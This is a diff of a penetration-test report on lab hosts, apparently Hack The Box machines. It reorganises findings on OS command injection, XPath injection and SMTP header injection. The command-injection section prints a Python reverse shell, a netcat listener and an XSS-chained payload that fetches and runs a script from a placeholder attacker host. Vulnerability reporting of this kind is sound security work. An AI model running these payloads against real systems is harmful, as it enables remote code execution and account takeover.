@@ -15,9 +15,9 @@
         * [RoyalFlush - SQL Injection in Secondary Email Update](#4cb36112-a85b-466a-93be-e4624ca6211b)
         * [RoyalFlush - Insecure Deserialization Leading to Remote Code Execution](#cc59c064-41d8-493c-b1f8-6687f77c9195)
         * [RoyalFlush - Hardcoded Credentials in Source Code Repository](#1164c285-502e-4806-8cad-a89d34950f67)
+        * [SecureData - OS Command Injection in Service Status API Endpoint](#227c4e36-2836-4d1f-ac00-d1fe6b010352)
         * [SecureData - Stored Cross-Site Scripting (XSS) via Log Poisoning](#9649bc09-b976-4cb8-8c94-ec6ecea8204e)
         * [SecureData - XPath Injection in File Search Functionality](#8fb8a524-1003-40ab-9325-b42f03a8e9cf)
-        * [SecureData - OS Command Injection in Service Status API Endpoint](#227c4e36-2836-4d1f-ac00-d1fe6b010352)
         * [VitaMedix - Server-Side JavaScript Injection via eval()](#5817ed19-e137-4c44-985b-bcc5cab13274)
         * [VitaMedix - SMTP Header Injection in Password Reset Functionality](#28dc6a62-8834-439d-b031-9d9cdc65126c)
         * [VitaMedix - Second-Order IDOR via Session Variable Manipulation](#d4dee736-a418-498b-aa46-93545715d3af)
@@ -441,7 +441,6 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N (8.7 - High)
 
 * RoyalFlush - API endpoints protected by api_key_required
 
-#### External References
 
 
 
@@ -843,9 +842,6 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (7.1 - High)
 
 * Git.RoyalFlush.htb
 
-#### External References
-
-
 
 #### Description & Cause
 
@@ -872,9 +868,6 @@ Exploit script: [AuthForger.py](exploits/AuthForger.py)
 
 ![Screenshot: A forged token granting /admin access, the username in the forged token has been highlighted](assets/image-1Y0zu4sF.png){width="auto"}
 
-#### Code Analysis
-
-
 
 #### Patching and Remediation
 
@@ -884,6 +877,119 @@ Credentials should never be stored in source code repositories. Instead, impleme
 
 For the hardcoded credentials in source files such as `DbService.cs` and `config/database.php`, refactor the code to read these values from environment variables or a secrets manager rather than embedding them directly. 
 
+
+
+### SecureData - OS Command Injection in Service Status API Endpoint {#227c4e36-2836-4d1f-ac00-d1fe6b010352}
+
+#### CWE
+
+CWE-78
+
+#### CVSS 4.0
+
+CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (9.4 - Critical)
+
+#### Affected Component(s)
+
+* SecureData.htb - `api.securedata.htb/service_status` endpoint (`service` parameter)
+
+
+#### Description & Cause
+
+The internal API at \`api.securedata.htb\` contains an OS command injection vulnerability in the \`/service\_status\` endpoint. The \`service\` parameter is passed directly to a system command without proper sanitization, allowing an attacker to execute arbitrary commands on the underlying server. While the API is restricted to internal network access only, this protection can be bypassed by leveraging the Stored XSS vulnerability documented separately in this report (see: Stored Cross-Site Scripting (XSS) via Log Poisoning). Combined, these vulnerabilities allow an external attacker to achieve remote code execution on the API server.
+
+
+#### Security Impact
+
+Successful exploitation of this vulnerability allows an attacker to execute arbitrary operating system commands on the API server. During testing, this vulnerability was exploited to obtain a reverse shell on the server and access sensitive files. An attacker with this level of access could read confidential data, modify or delete files, and potentially disrupt service availability.
+
+
+#### Detailed Walkthrough
+
+The potential for command injection was identified by reviewing the code extracted via XPath injection for \`admin\_panel.php\`, which revealed API calls to \`/service\_status?service=\<n>\`. The endpoint naming and parameter structure suggested the service name was likely passed to a system command. The admin dashboard makes client-side JavaScript requests to an internal API to display system information:
+
+- `http://api.securedata.htb/fetch_logs` - Retrieves operation logs
+- `http://api.securedata.htb/fetch_sysinfo` - Retrieves system metrics
+- `http://api.securedata.htb/service_status?service=<n>` - Checks service status
+
+Direct access to the API from external sources returned "Forbidden", indicating IP-based access restrictions, which seemed likely considering the message shown below. 
+
+![Screenshot: A message shown in the admin panel noting the application uses IP restrictions](assets/image.png){width="auto"}
+
+Attempts to bypass this restriction by spoofing an internal IP origin using \`X-Forwarded-For\` and \`Client-IP\` headers were unsuccessful. As a result, the Stored XSS vulnerability in the log functionality (documented separately) was leveraged to execute requests from an authorized internal context. In order for this injection to work, the request needed to include a session token for a logged in user.
+
+The tester submitted a stored XSS payload as per the "Stored Cross-Site Scripting (XSS) via Log Poisoning" vulnerability, causing an internal user with access to the API to inject the command on the tester's behalf. This request then exploited the vulnerability and sent an interactive connection back to the tester.
+
+## Steps to Reproduce
+
+**Step 1: Set up a listener and host the reverse shell**
+
+Prepare a reverse shell script (e.g., `shell.sh`) on an attacker-controlled web server. 
+
+```bash
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<IP>",<Shell PORT>))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+```
+
+**Step 2: Prepare listeners**
+The reverse shell script needs to be hosted by a webserver so that the victim server can download it. A simple alternative for this is using Python's http server module:
+
+
+```
+python -m http.server <Webserver PORT>
+```
+
+Additionally, there needs to be a netcat listener waiting for the reverse shell to connect back, this IP and PORT needs to reflect the values inside shell.sh:
+
+```
+nc -lvp <Shell PORT>
+```
+
+**Step 3: Inject the chained payload**
+
+Submit a request with an XSS payload in the `X-Forwarded-For` header. The payload trigger causes anyone viewing it to contact the internal API `/service_status` endpoint with the shell execution command in the `service` parameter:
+
+```bash
+curl -X GET "http://securedata.htb/home.php" \
+  -H "Cookie: session=<Authenticated user token>" \
+  -H "X-Forwarded-For: <img src=x onerror=\"var x=new XMLHttpRequest();x.open('GET','http://api.securedata.htb/service_status?service=apache2;curl+http://<IP>:<Webserver PORT>/shell.sh+-o+/tmp/s.sh;python3+/tmp/s.sh');x.send();\">"
+```
+
+**Step 3: Wait for payload execution**
+
+When an internal user or automated process views the poisoned logs in the admin panel, the JavaScript executes in their browser context. Since their browser has access to the internal API, the malicious request is sent to `/service_status`, triggering command injection on the API server.
+
+**Step 4: Receive the reverse shell**
+
+The API server executes the injected commands, fetching and running the reverse shell script. The attacker's listener receives a connection.
+
+![Screenshot: A connection opening to the vulnerable server allowing the tester to run commands such as 'ls' to list files as root](assets/image-TV0rZf2z.png){width="auto"}
+
+
+#### Code Analysis
+
+**File:** `admin_panel.php` (lines 210-214)
+
+```php
+// fetch service status
+const fetchServiceStatus = async (service) => {
+    try {
+        const response = await fetch(`http://api.securedata.htb/service_status?service=${service}`); //Suspicious code which prompted investigation
+        const data = await response.json();
+```
+
+#### Patching and Remediation
+
+The `service` parameter should be validated against a strict allowlist of permitted service names (e.g., `apache2`, `nginx`, `mysql`). Any input containing shell metacharacters such as `;`, `|`, `&`, `$`, backticks, or newlines should be rejected outright.
+
+Where possible, shell command execution should be avoided entirely. Instead of executing shell commands, use direct system APIs or libraries to check service status. If shell execution is unavoidable, use parameterized execution methods that do not interpret shell metacharacters, such as passing arguments as an array rather than a concatenated string.
+
+Additionally, the API should not rely solely on IP-based access controls, as these were bypassed via XSS. Implementing proper authentication and authorization on the API endpoints, such as API keys or tokens that cannot be obtained or replayed through client-side attacks, would provide defense in depth.
 
 
 ### SecureData - Stored Cross-Site Scripting (XSS) via Log Poisoning {#9649bc09-b976-4cb8-8c94-ec6ecea8204e}
@@ -1062,9 +1168,6 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (8.7 - High)
 
 * SecureData.htb  - File Search Endpoint - `q` parameter in `/query.php`
 
-#### External References
-
-
 
 #### Description & Cause
 
@@ -1080,9 +1183,13 @@ Successful exploitation of this vulnerability allows an attacker to enumerate an
 
 #### Detailed Walkthrough
 
-The `q` parameter accepts user input for searching files by name. The backend constructs an XPath query using this input without proper sanitization. By injecting XPath syntax, an attacker can modify the query's logic.
+During black-box testing, the tester injected a single quote (`'`) into the `q` parameter of the file search functionality. The application returned an error, indicating that the input was being interpreted as part of a query structure rather than as a literal search term. This behavior suggested the presence of an injection vulnerability. 
 
-It was first discovered by supplying a single quotation character, which caused an error and indicated that input was being improperly handled.
+![Screenshot: The returned error upon submitting a single quotation character](assets/image-ybZJ8R5h.png){width="auto"}
+
+The tester proceeded to examine both SQL injection and XPath injection vectors. SQL injection payloads did not produce meaningful results, however XPath-specific payloads successfully manipulated the query logic, confirming XPath injection.
+
+The `q` parameter accepts user input for searching files by name. The backend constructs an XPath query using this input without proper sanitization. By injecting XPath syntax, an attacker can modify the query's logic.
 
 The application appears to execute a query similar to:
 
@@ -1150,123 +1257,11 @@ done
 ```
 
 
-#### Code Analysis
-
-
-
 #### Patching and Remediation
 
 Implement strict whitelist validation on the \`q\` parameter, allowing only alphanumeric characters and expected symbols such as dots and underscores for filenames. Additionally, verify the expected data-type and format, all user input should be treated as untrusted. If the XPath library supports it, use parameterized queries or prepared XPath expressions to separate data from query logic. 
 
 Additionally, the application should not return download tokens for restricted files to unauthenticated users regardless of how the query is constructed. Server-side authorization checks on file downloads should verify user permissions independently of the search mechanism.
-
-
-### SecureData - OS Command Injection in Service Status API Endpoint {#227c4e36-2836-4d1f-ac00-d1fe6b010352}
-
-#### CWE
-
-CWE-78
-
-#### CVSS 4.0
-
-CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (9.4 - Critical)
-
-#### Affected Component(s)
-
-* SecureData.htb - `api.securedata.htb/service_status` endpoint (`service` parameter)
-
-#### External References
-
-
-
-#### Description & Cause
-
-The internal API at \`api.securedata.htb\` contains an OS command injection vulnerability in the \`/service\_status\` endpoint. The \`service\` parameter is passed directly to a system command without proper sanitization, allowing an attacker to execute arbitrary commands on the underlying server. While the API is restricted to internal network access only, this protection can be bypassed by leveraging the Stored XSS vulnerability documented separately in this report (see: Stored Cross-Site Scripting (XSS) via Log Poisoning). Combined, these vulnerabilities allow an external attacker to achieve remote code execution on the API server.
-
-
-#### Security Impact
-
-Successful exploitation of this vulnerability allows an attacker to execute arbitrary operating system commands on the API server. During testing, this vulnerability was exploited to obtain a reverse shell on the server and access sensitive files. An attacker with this level of access could read confidential data, modify or delete files, and potentially disrupt service availability.
-
-
-#### Detailed Walkthrough
-
-The potential for command injection was identified by reviewing the client-side code in \`admin\_panel.php\`, which revealed API calls to \`/service\_status?service=\<n>\`. The endpoint naming and parameter structure suggested the service name was likely passed to a system command. The admin dashboard makes client-side JavaScript requests to an internal API to display system information:
-
-- `http://api.securedata.htb/fetch_logs` - Retrieves operation logs
-- `http://api.securedata.htb/fetch_sysinfo` - Retrieves system metrics
-- `http://api.securedata.htb/service_status?service=<n>` - Checks service status
-
-Direct access to the API from external sources returned "Forbidden", indicating IP-based access restrictions, which seemed likely considering the message shown below. 
-
-![Screenshot: A message shown in the admin panel noting the application uses IP restrictions](assets/image.png){width="auto"}
-
-Attempts to bypass this restriction by spoofing an internal IP origin using \`X-Forwarded-For\` and \`Client-IP\` headers were unsuccessful. As a result, the Stored XSS vulnerability in the log functionality (documented separately) was leveraged to execute requests from an authorized internal context. In order for this injection to work, the request needed to include a session token for a logged in user.
-
-The tester submitted a stored XSS payload as per the "Stored Cross-Site Scripting (XSS) via Log Poisoning" vulnerability, causing an internal user with access to the API to inject the command on the tester's behalf. This request then exploited the vulnerability and sent an interactive connection back to the tester.
-
-## Steps to Reproduce
-
-**Step 1: Set up a listener and host the reverse shell**
-
-Prepare a reverse shell script (e.g., `shell.sh`) on an attacker-controlled web server. 
-
-```bash
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("<IP>",<Shell PORT>))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-subprocess.call(["/bin/sh","-i"])
-```
-
-**Step 2: Prepare listeners**
-The reverse shell script needs to be hosted by a webserver so that the victim server can download it. A simple alternative for this is using Python's http server module:
-
-
-```
-python -m http.server <Webserver PORT>
-```
-
-Additionally, there needs to be a netcat listener waiting for the reverse shell to connect back, this IP and PORT needs to reflect the values inside shell.sh:
-
-```
-nc -lvp <Shell PORT>
-```
-
-**Step 3: Inject the chained payload**
-
-Submit a request with an XSS payload in the `X-Forwarded-For` header. The payload trigger causes anyone viewing it to contact the internal API `/service_status` endpoint with the shell execution command in the `service` parameter:
-
-```bash
-curl -X GET "http://securedata.htb/home.php" \
-  -H "Cookie: session=<Authenticated user token>" \
-  -H "X-Forwarded-For: <img src=x onerror=\"var x=new XMLHttpRequest();x.open('GET','http://api.securedata.htb/service_status?service=apache2;curl+http://<IP>:<Webserver PORT>/shell.sh+-o+/tmp/s.sh;python3+/tmp/s.sh');x.send();\">"
-```
-
-**Step 3: Wait for payload execution**
-
-When an internal user or automated process views the poisoned logs in the admin panel, the JavaScript executes in their browser context. Since their browser has access to the internal API, the malicious request is sent to `/service_status`, triggering command injection on the API server.
-
-**Step 4: Receive the reverse shell**
-
-The API server executes the injected commands, fetching and running the reverse shell script. The attacker's listener receives a connection.
-
-![Screenshot: A connection opening to the vulnerable server allowing the tester to run commands such as 'ls' to list files as root](assets/image-TV0rZf2z.png){width="auto"}
-
-
-#### Code Analysis
-
-
-
-#### Patching and Remediation
-
-The `service` parameter should be validated against a strict allowlist of permitted service names (e.g., `apache2`, `nginx`, `mysql`). Any input containing shell metacharacters such as `;`, `|`, `&`, `$`, backticks, or newlines should be rejected outright.
-
-Where possible, shell command execution should be avoided entirely. Instead of executing shell commands, use direct system APIs or libraries to check service status. If shell execution is unavoidable, use parameterized execution methods that do not interpret shell metacharacters, such as passing arguments as an array rather than a concatenated string.
-
-Additionally, the API should not rely solely on IP-based access controls, as these were bypassed via XSS. Implementing proper authentication and authorization on the API endpoints, such as API keys or tokens that cannot be obtained or replayed through client-side attacks, would provide defense in depth.
 
 
 ### VitaMedix - Server-Side JavaScript Injection via eval() {#5817ed19-e137-4c44-985b-bcc5cab13274}
@@ -1282,9 +1277,6 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (9.4 - Critical)
 #### Affected Component(s)
 
 * Newsletter.VitaMedix.htb - endpoint ` /api/settings/save` 
-
-#### External References
-
 
 
 #### Description & Cause
@@ -1382,9 +1374,6 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:L/SC:N/SI:N/SA:N (8.8 - High)
 
 * Selfservice.VitaMedix.htb - Password Reset Email Function (` /reset`  endpoint)
 
-#### External References
-
-
 
 #### Description & Cause
 
@@ -1398,13 +1387,12 @@ An attacker can exploit this vulnerability to intercept password reset tokens fo
 
 #### Detailed Walkthrough
 
+During blackbox testing of the application, the tester identified a password reset function at `selfservice.vitamedix.htb` that accepts a user-supplied email address. Web applications that incorporate user input into email functionality are commonly susceptible to SMTP Header Injection if proper sanitization is not implemented. Recognizing this potential attack surface, the tester began injecting CRLF sequences (`%0d%0a`) followed by additional SMTP headers into the email parameter to determine whether the application was vulnerable.
+
+
 The password reset functionality at `selfservice.vitamedix.htb` accepts an email address parameter to identify the user requesting a password reset. This email value is incorporated into the SMTP headers of the outgoing reset email without proper sanitization of CRLF (Carriage Return Line Feed) control characters.
 
-
-
 SMTP headers are separated by CRLF sequences (`\r\n\`). When these characters are not stripped or encoded from user input, an attacker can terminate the current header and inject additional headers into the email message.
-
-
 
 By using the following command, an attacker can inject a \`Bcc\` header in the email sent with the new password for the user michael. This causes the mail server to send a blind carbon copy of the password reset email to an attacker-controlled address:
 
@@ -1425,10 +1413,6 @@ curl -X POST 'http://selfservice.vitamedix.htb/reset.php' \
 **Note: The tester found written credentials for smtp-dev@vitamedix.htb due to the Second-Order IDOR vulnerability, which is why it's used as Bcc.**
 
 ![Screenshot: The received email with the injected bcc payload causing it to be sent to the tester-controlled email](assets/image-PvcMH5pX.png){width="auto"}
-
-
-#### Code Analysis
-
 
 
 #### Patching and Remediation
@@ -1586,9 +1570,6 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (8.7 - High)
 
 * Git.VitaMedix.htb
 
-#### External References
-
-
 
 #### Description & Cause
 
@@ -1633,8 +1614,6 @@ $dBName="db";
 
 ![Screenshot: Access to the DNS admin interface](assets/image-Dk4Ol4sN.png){width="auto"}
 
-
-#### Code Analysis
 
 
 
